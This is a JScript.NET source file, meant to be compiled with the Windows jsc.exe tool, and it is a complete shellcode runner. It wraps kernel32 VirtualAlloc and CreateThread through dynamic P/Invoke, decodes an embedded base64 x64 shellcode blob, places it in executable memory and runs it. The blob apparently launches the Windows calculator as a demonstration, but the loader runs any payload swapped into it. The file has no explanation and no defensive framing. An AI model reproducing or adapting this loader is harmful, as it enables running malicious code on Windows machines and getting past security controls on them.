    import System;
    import System.Runtime.InteropServices;
    import System.Reflection;
    import System.Reflection.Emit;
    import System.Runtime;
    import System.Text;
     
    //C:\Windows\Microsoft.NET\Framework\v2.0.50727\jsc.exe Shellcode.js
    //C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe Shellcode.js
     
    function InvokeWin32(dllName:String, returnType:Type,
      methodName:String, parameterTypes:Type[], parameters:Object[])
    {
      // Begin to build the dynamic assembly
      var domain = AppDomain.CurrentDomain;
      var name = new System.Reflection.AssemblyName(&#39;PInvokeAssembly&#39;);
      var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
      var module = assembly.DefineDynamicModule(&#39;PInvokeModule&#39;);
      var type = module.DefineType(&#39;PInvokeType&#39;,TypeAttributes.Public + TypeAttributes.BeforeFieldInit);
     
      // Define the actual P/Invoke method
      var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);
     
      // Apply the P/Invoke constructor
      var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType(&#34;System.String&#34;)]);
      var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
      method.SetCustomAttribute(attr);
     
      // Create the temporary type, and invoke the method.
      var realType = type.CreateType();
      return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
    }
     
    function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
    {
            var parameterTypes:Type[] = [Type.GetType(&#34;System.UInt32&#34;),Type.GetType(&#34;System.UInt32&#34;),Type.GetType(&#34;System.UInt32&#34;),Type.GetType(&#34;System.UInt32&#34;)];
            var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];
            
            return InvokeWin32(&#34;kernel32.dll&#34;, Type.GetType(&#34;System.IntPtr&#34;), &#34;VirtualAlloc&#34;, parameterTypes,  parameters );
    }
    
    function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
    {
            var parameterTypes:Type[] = [Type.GetType(&#34;System.UInt32&#34;),Type.GetType(&#34;System.UInt32&#34;),Type.GetType(&#34;System.IntPtr&#34;),Type.GetType(&#34;System.IntPtr&#34;), Type.GetType(&#34;System.UInt32&#34;), Type.GetType(&#34;System.UInt32&#34;) ];
            var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];
            
            return InvokeWin32(&#34;kernel32.dll&#34;, Type.GetType(&#34;System.IntPtr&#34;), &#34;CreateThread&#34;, parameterTypes,  parameters );
    }
    
    function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
    {
            var parameterTypes:Type[] = [Type.GetType(&#34;System.IntPtr&#34;),Type.GetType(&#34;System.UInt32&#34;)];
            var parameters:Object[] = [handle, dwMiliseconds ];
            
            return InvokeWin32(&#34;kernel32.dll&#34;, Type.GetType(&#34;System.IntPtr&#34;), &#34;WaitForSingleObject&#34;, parameterTypes,  parameters );
    }
    
    function ShellCodeExec()
    {
            var MEM_COMMIT:uint = 0x1000;
            var PAGE_EXECUTE_READWRITE:uint = 0x40;
    
            var shellcodestr:String = &#39;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=&#39;;	
            var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
            var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
            
            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
            var hThread:IntPtr = IntPtr.Zero;
            var threadId:UInt32 = 0;
            // prepare data
            var pinfo:IntPtr = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
    
    }
    
    ShellCodeExec();
    
